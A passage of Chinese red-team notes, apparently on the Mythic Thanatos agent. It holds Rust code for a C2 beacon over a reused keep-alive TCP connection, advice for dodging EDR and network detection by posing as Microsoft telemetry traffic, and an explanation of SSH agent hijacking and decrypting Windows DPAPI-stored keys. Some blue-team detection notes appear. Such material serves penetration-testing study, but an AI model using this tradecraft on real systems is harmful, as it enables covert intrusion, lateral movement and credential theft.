            Connection: keep-alive\r\n\r\n",
            path,
            host,
            data.len()
        );

        // 2. 复用现有 TCP 管道发送
        stream.write_all(req_header.as_bytes()).await?;
        stream.write_all(data).await?;
        stream.flush().await?;

        // 3. 读取响应：解析 HTTP Header 获取 Content-Length 并读取完整 Body
        // 保证 TCP 管道处于干净状态以便下一次使用
        let mut header_buf = Vec::new();
        let mut byte = [0u8; 1];

        // 简易读取 Header 直至 \r\n\r\n
        while !header_buf.ends_with(b"\r\n\r\n") {
            if stream.read_exact(&mut byte).await? == 0 {
                return Err("Connection reset by peer".into());
            }
            header_buf.push(byte[0]);
        }

        let header_str = String::from_utf8_lossy(&header_buf);
        let content_len = parse_content_length(&header_str).unwrap_or(0);

        // 精确读取 Body 长度
        let mut body = vec![0u8; content_len];
        if content_len > 0 {
            stream.read_exact(&mut body).await?;
        }

        Ok(body)
    }

    fn parse_content_length(header: &str) -> Option<usize> {
        for line in header.lines() {
            if line.to_ascii_lowercase().starts_with("content-length:") {
                return line.split(':').nth(1)?.trim().parse().ok();
            }
        }
        None
    }

    #[tokio::main]
    async fn main() -> Result<(), Box<dyn std::error::Error>> {
        let host = "192.168.1.100";
        let port = 80;

        // 建立一次底层 TCP 管道
        let mut stream = TcpStream::connect(format!("{}:{}", host, port)).
  await?;

        loop {
            let dummy_payload = b"id=0x1234&heartbeat=ping";

  ### 二、 Windows 10 / 11 底层演进与行为特征

  从 Windows Internals 的网络遥测与安全监控演进来看，单连接复用（HTTP Keep-
  Alive）与短频短连接具有截然不同的行为足迹：

  1. ETW 与内核遥测抑制（Sysmon Event 3 / Defender for Endpoint）：
      • 短连接轮询：若每次 Beacon 都新建连接，Windows 10/11 的 Microsoft-
      Windows-TCPIP 内核 ETW Provider 会不断产生 TcpEndpointConnect 和
      TcpDisconnect 事件，Sysmon 也会密集打印 Event ID 3 (Network
      connection)。这种高频握手极易触发 SIEM/EDR 的频次偏离告警。
      • Keep-Alive 管道复用：在整个生存周期内，操作系统内核仅记录一次 TCP
      握手事件。后续的短 POST 只是在同一个 Socket（统一的五元组）上发生
      TcpDataTransfer，不会反复触发连接建立告警。
  2. WinHTTP / WinINet 现代演进对比：
      • 在 Windows 10（RS5+）和 Windows 11 中，微软重构了内置的 WinHttp
      引擎，引入了基于 HTTP/2 和 HTTP/3 (QUIC)
      的透明多路复用连接池（Connection Pool）。
      • 采用自定义 Tokio TcpStream 相比直接调用系统 winhttp.dll，绕过了
      WinHTTP 的统一代理感知、系统凭据自动附加（SSPI/Negotiate）以及
      SmartScreen/Web Protection
      的部分过滤插件，但也意味着代理穿透（PAC、NTLM 代理认证）需要自实现。

  ### 三、 Red Teaming / 渗透测试工程实战考量

  在实战攻防与高对抗环境中，这种模式需要重点注意以下几项细节：

  1. 中间节点（CDN / Reverse Proxy）的限制与重连机制：
      • 反向代理（如 Nginx、Cloudflare、AWS ALB）都会配置
      keepalive_timeout（通常 60~75 秒）和
      keepalive_requests（单个连接允许的最大请求数，如 100 次）。
      • 对策：Agent 的代码中必须包含捕获 UnexpectedEof / ConnectionReset
      的弹性重连逻辑。当连接达到代理的阈值被对端发送 FIN
      关闭后，自动触发重新握手。
  2. 报文指纹伪装（Masquerading）：
      • 短 HTTP POST 往往容易被 NTA/NDR 检测特征（如固定大小包头、无 Cookie
      等）。
      • 建议伪装成目标系统的正常背景遥测，例如 Windows 10/11 常见的服务流量：
          • watson.telemetry.microsoft.com（错误汇报）
          • v10.events.data.microsoft.com（诊断遥测）
      • 配合使用动态 Jitter（抖动）的 Sleep 间隔以及在 POST Body
      末尾填充随机垃圾字节（Random Padding），破坏基于固定包长（Fixed Payload
      Size）的流分析算法。
  3. HTTP 解析陷阱（报文截断与不同步）：
      • 在手工处理 HTTP 流复用时，务必严谨匹配 Content-
      Length。如果服务端开启了 Transfer-Encoding: chunked
      或者返回了意外的状态码（如 302/404 带有错误 Body），而客户端未把 Body
      消费干净，会导致下一个 POST
      报文与前一个响应的残留数据粘连，导致通信信道彻底不同步失效。


# Mythic 协议 Piggybacking（心跳顺风车）

Mythic协议 将Piggybacking（心跳顺风车）结合在心跳轮询（GetTasking）中.

**特征**
1. 凭据与认证复用:SSH Agent Piggybacking / Hijacking（ATT&CKT1563.001）.这是 Thanatos最具特色的横向移动能力。攻击者无需窃取明文口令或私钥文件，直接“搭便车”挂载目标机器上合法管理员已解锁的 ssh-agent套接字/管道，复用其签名认证能力实现免密横向扩散（如 ssh-spawn 投递衍生Agent、ssh-exec 执行指令等）
2. 辅助维度（信道与通信复用）：C2 流量捎带与网络中继（ATT&CK T1090）包括 HTTP Beaconing 周期轮询中的“任务捎带确认与分块接力”（Request/ResponsePiggybacking），以及通过 redirect.rs 实现的内网主机顺风车穿透中继（TCP Pivot）

**核心实现**

  ### 二、 顺风车交互协议格式详解
  #### 1. 底层传输协议：OpenSSH Agent Protocol 帧格式

  Thanatos 的 ssh2-rs 驱动在与本地 Agent 套接字通信时，遵循 OpenSSH Agent
  Protocol（基于 IETF draft-miller-ssh-agent 规范）。
  通信基于二进制流，每个数据包的基础帧格式为：
    +--------------------+---------------+------------------------+
    | 4 字节数据长度 (L) | 1 字节消息类型 |      消息内容 Payload   |
    | (uint32, 大端序)   | (1 字节 uint8) |      (L - 1 字节)      |
    +--------------------+---------------+------------------------+

  ##### (1) 公钥身份枚举 (Identity Request & Answer)
  • Thanatos -> SSH Agent (SSH2_AGENTC_REQUEST_IDENTITIES, 类型码 11)：
    00 00 00 01  0B
    [   长度 1  ] [Type=11]

  • SSH Agent -> Thanatos (SSH2_AGENT_IDENTITIES_ANSWER, 类型码 12)：
    [4B uint32: 长度] [1B Type=12] [4B uint32: 密钥数量 N]
    -- 重复 N 次 --
      [4B uint32: Key Blob 长度] [Key Blob: 包含算法如 ssh-rsa/ecdsa-sha2
  与公钥参数]
      [4B uint32: Comment 长度]  [Comment 字符串，如 "admin@bastion"]


  ##### (2) 挑战响应签名（顺风车签名的核心步骤）

  当目标 SSH 远程服务器向 Thanatos 发送公钥认证质询（Challenge）时，Thanatos
  通过 Agent 代理发起签名：

  • Thanatos -> SSH Agent (SSH2_AGENTC_SIGN_REQUEST, 类型码 13)：
    [4B uint32: 长度] [1B Type=13]
    [4B uint32: Key Blob 长度]   [目标公钥 Blob]
    [4B uint32: 待签名数据长度]  [包含会话 ID、用户名、服务名的待签名摘要]
    [4B uint32: Flags]          [签名算法标志位，如 0x02 表示 SHA-256 RSA]

  • SSH Agent -> Thanatos (SSH2_AGENT_SIGN_RESPONSE, 类型码 14)：
    [4B uint32: 长度] [1B Type=14]
    [4B uint32: Signature 长度]  [格式化签名，包含算法字符串与 R/S 签名值]
  Thanatos 将此签名封装在 SSH 包中发回目标服务器，鉴权宣告完成。

  ### 三、 Windows 10 与 Windows 11 下的内部机制演进与红队攻防

  在 Windows 环境下，SSH Agent 的实现原理与 Linux（Unix Domain
  Socket）存在本质差异。在现代 Windows 平台进行 Red Teaming
  研究时，必须重点关注以下系统底层机制的演进：

  #### 1. 架构演进：从 PuTTY Pageant 到 Windows 原生 OpenSSH Agent

  • 早期 Windows（Windows 10 1809 之前）：
  Windows 无原生 OpenSSH。用户主要依赖 PuTTY 的 Pageant 工具。Pageant 采用
  Windows GUI 消息机制（通过隐藏窗口类名 Pageant 接收 WM_COPYDATA
  消息）进行通信。红队进行 Piggybacking
  时需定位窗口句柄并跨进程投递内存指针。
  • Windows 10（1809+ / RS5）及 Windows 11：
  微软将 OpenSSH 正式内置为 Windows 功能（通过可选功能安装），其后台服务为
  ssh-agent.exe（服务名 ssh-agent），通常以 NT AUTHORITY\SYSTEM
  权限运行在系统会话中。

  #### 2. 通信媒介演进：Unix Domain Socket 与 Named Pipe

  • 命名管道通信：在 Windows 10 和 11 上，OpenSSH Agent 默认监听的 IPC
  终结点是一个著名的命名管道（Named Pipe）：

    \texttt{\textbackslash\textbackslash.\textbackslash pipe\textbackslash
  openssh-ssh-agent}

  • AF_UNIX 的引入：虽然 Windows 10 Build 17063 及更高版本（包括 Windows
  11）已经在 Winsock (ws2_32.dll) 中支持了 Unix 域套接字（AF_UNIX），但
  Windows 官方维护的 OpenSSH 服务仍然以 Named Pipe 作为标准传输介质。
  • 红队复用挑战：Thanatos 使用的 ssh2-rs 主要是对 libssh2 的绑定。在 Windows
  上直接读取 SSH_AUTH_SOCK 路径若指向命名管道，需底层库支持 Windows Named
  Pipe 适配层。如果以普通权限运行，跨权限访问该管道受 DACL 严格控制。

  #### 3. 密钥持久化与 Windows DPAPI（关键演进差异）

  Linux 的 ssh-agent 通常仅驻留于临时内存，会话注销或重启后即消失。然而在
  Windows 10 和 Windows 11 上，微软对 OpenSSH Agent
  增加了本地持久化存储机制：

  • 当用户执行 ssh-add 添加密钥后，Windows OpenSSH Agent
  会将私钥持久化加密保存在注册表项中：
      • 用户范围：HKCU\Software\OpenSSH\Agent\Keys
      • 系统范围：HKLM\SOFTWARE\OpenSSH\Agent\Keys
  • DPAPI 保护：私钥数据采用 Windows DPAPI (CryptProtectData)
  加密，密钥与用户的登录凭据绑定。
  • 红队/渗透测试含义：
      • 在 Windows 10/11 提权至 SYSTEM 权限后，红队人员不仅能 Piggyback
      监听当前管道，还能直接通过令牌模拟（SeImpersonatePrivilege）或者利用类
      似 Mimikatz、SharpDPAPI
      等工具解密注册表中的持久化私钥，直接从“顺风车借用”升级为“私钥永久离线提
      权”。


  #### 4. 蓝队监控与 EDR 检测演进

  • 管道事件审计：Windows 11 及带有 Sysmon 的 Windows 10 可通过 Sysmon Event
  ID 17/18（Pipe Created / Pipe Connected） 监控针对 \pipe\openssh-ssh-agent
  的异常跨进程连接行为。
  • 异构父子进程与网络行为：Thanatos 这类 Agent 若在 svchost.exe
  或未知非系统进程中产生对目标网段端口 22 的连续 TCP 握手，结合缺少常规 SSH.
  exe 进程树衍生特征，容易触发行为告警。

  ### 总结

  在 Thanatos 架构中，Piggybacking 的核心是 “凭据状态的借调与复用”：

  1. 它通过利用宿主环境遗留的合法认证套接字/命名管道，完成了利用 OpenSSH
  Agent 协议规范的免密横向穿越；
  2. 在 Windows 10/11 演进背景下，该机制从传统的 Unix Socket 跨越到了 Windows
  命名管道与 DPAPI 持久化注册表，极大地拓宽了内网渗透中的无凭据横向战术面；
  3. 同时结合 C2 报文捎带机制与 Tokio
  异步重定向转发，实现了网络层面与凭据层面的双重“搭便车”
